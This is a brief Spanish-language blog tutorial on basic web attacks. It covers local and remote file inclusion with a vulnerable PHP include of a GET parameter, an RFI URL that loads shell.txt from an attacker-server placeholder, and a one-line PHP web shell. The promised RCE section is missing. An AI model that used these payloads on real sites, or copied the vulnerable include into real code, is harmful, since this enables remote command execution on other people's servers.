---
layout: post
title:  "Aprendiendo a identificar los diferentes ataques basicos a nivel Web"
description: Aprendiendo sobre las Vulnerabilidades " LFI // RFI // RCE "
tags: Web Attacks
---
Empezaremos por aprender las principales Vulnerabilidades a nivel Web
  
1 ~ LFI ~   Local File Inclusion
2 ~ RFI ~   Remote File Inclusion
3 ~ RCE ~   Remote Code Execution

1.- La vulnerabilidad de Local File Inclusion se produce como consecuencia de un fallo en la programación de la página, filtrando inadecuadamente lo que se incluye al usar funciones en PHP para incluir archivos.
Para poder corroborar si un sitio es vulnerable, se puede colocar un valor ilógico a la variable. 
En nuestro ejemplo tenemos: "http://localhost/index.php?page=" donde se coloca un valor, en este caso http://localhost/index.php?page=78se3, algo aleatorio que no se encuentre registrado.
Si arroja un error como Warning: main()… o Warning: include()… o similar entonces es probable que sea vulnerable a RFI o LFI

{% PHP - LFI Codigo Vulnerable por Detras %}
<?php
include $_GET[‘pagina’];
?>
{% endhighlight %}


La vulnerabilidad de Remote File Inclusion se produce cuando:

Una página vulnerable que presente un aspecto similar a este en su URL:   " http://[servidor_victima]/index.php?page=plantilla.html "

El atacante (Nosotros) podriamos obtener una Shell en el servidor vulnerable mediante lo siguiente:

---html
http://[servidor_victima]/index.php?page=http://[servidor_atacante]/shell.txt&&cmd=ls
---

Pudiendo contener el archivo shell.txt cualquier código, por ejemplo:
--- php
<?php
  system($cmd);
?>
---
